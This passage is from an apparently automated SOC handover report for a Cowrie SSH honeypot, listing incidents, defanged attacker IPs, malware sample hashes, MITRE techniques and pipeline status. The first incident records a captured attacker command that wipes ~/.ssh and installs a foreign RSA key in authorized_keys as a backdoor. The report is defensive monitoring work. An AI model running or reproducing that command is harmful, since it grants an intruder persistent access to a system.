| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 10:47 |
| **Last Seen** | 2026-04-08 10:48 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:47:46` | `cowrie.session.connect` |
| `2026-04-08 10:47:46` | `cowrie.client.version` |
| `2026-04-08 10:47:47` | `cowrie.client.kex` |
| `2026-04-08 10:47:51` | `cowrie.login.success` |
| `2026-04-08 10:47:59` | `cowrie.session.params` |
| `2026-04-08 10:47:59` | `cowrie.command.input` |
| `2026-04-08 10:47:59` | `cowrie.command.failed` |
| `2026-04-08 10:48:06` | `cowrie.log.closed` |
| `2026-04-08 10:48:08` | `cowrie.session.params` |
| `2026-04-08 10:48:08` | `cowrie.command.input` |
| `2026-04-08 10:48:09` | `cowrie.session.file_download` |
| `2026-04-08 10:48:09` | `cowrie.log.closed` |
| `2026-04-08 10:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-484960625187

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 10:48 |
| **Last Seen** | 2026-04-08 10:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:48:23` | `cowrie.session.connect` |
| `2026-04-08 10:48:25` | `cowrie.client.version` |
| `2026-04-08 10:48:26` | `cowrie.client.kex` |
| `2026-04-08 10:48:28` | `cowrie.login.success` |
| `2026-04-08 10:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.210.21[.]242` | **25** | 2026-04-08 09:52 | 2026-04-08 10:35 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.217.199[.]222` | **25** | 2026-04-08 10:00 | 2026-04-08 10:44 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `46.8.237[.]64` | **14** | 2026-04-08 09:57 | 2026-04-08 10:20 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.2.83[.]149` | **13** | 2026-04-08 09:53 | 2026-04-08 10:48 | 1m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `171.244.37[.]97` | **3** | 2026-04-08 09:53 | 2026-04-08 09:59 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `186.219.184[.]142` | **3** | 2026-04-08 08:59 | 2026-04-08 09:03 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `5.181.87[.]35` | **3** | 2026-04-08 08:58 | 2026-04-08 09:02 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.42[.]17` | **2** | 2026-04-08 09:59 | 2026-04-08 10:01 | 4m | 0 | `T1592` | 🟢 LOW |
| `1.71.143[.]145` | 1 | 2026-04-08 10:48 | 2026-04-08 10:48 | 30s | 0 | `T1592` | 🟢 LOW |
| `114.200.210[.]83` | 1 | 2026-04-08 10:36 | 2026-04-08 10:36 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]75` | 1 | 2026-04-08 10:04 | 2026-04-08 10:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `144.48.243[.]18` | 1 | 2026-04-08 10:00 | 2026-04-08 10:00 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `204.76.203[.]175` | 1 | 2026-04-08 10:40 | 2026-04-08 10:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]176` | 1 | 2026-04-08 10:40 | 2026-04-08 10:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]177` | 1 | 2026-04-08 10:40 | 2026-04-08 10:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]179` | 1 | 2026-04-08 10:40 | 2026-04-08 10:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.71.111[.]34` | 1 | 2026-04-08 09:55 | 2026-04-08 09:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.237.94[.]18` | 1 | 2026-04-08 09:58 | 2026-04-08 09:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.134.203[.]156` | 1 | 2026-04-08 10:00 | 2026-04-08 10:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.148[.]31` | 1 | 2026-04-08 09:24 | 2026-04-08 09:25 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `46.8.237[.]64` | FI | CGI GLOBAL LIMITED | **100** ⚠️ | 1 |
| `204.76.203[.]179` | NL | Intelligence Hosting LLC | **100** ⚠️ | 5 |
| `204.76.203[.]176` | NL | Intelligence Hosting LLC | **100** ⚠️ | 1 |
| `204.76.203[.]177` | NL | Intelligence Hosting LLC | **100** ⚠️ | 1 |
| `103.210.21[.]242` | HK | Ucloud Hong Kong | **100** ⚠️ | 50 |
| `144.48.243[.]18` | HK | Overcasts Limited | **100** ⚠️ | 30 |
| `5.181.87[.]35` | TR | Pitline Ltd | **100** ⚠️ | 35 |
| `36.134.203[.]156` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `34.71.111[.]34` | US | Google LLC | **100** ⚠️ | 17 |
| `45.148.148[.]31` | UA | DEMENIN B.V. | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 193 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 90 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 70 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 38 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 38 |

---

## 🔕 False Positive Summary (77 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 28 |
| AbuseIPDB score 10 below threshold 25 | 10 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 39 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 246 cases |
| Tool 34  | Credential Extractor        | ✅ 160 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 77 filtered (31.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 69 priority case(s) shown individually · 20 recon entry/entries in table (8 group(s) consolidating 88 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-08T10:54:49Z_
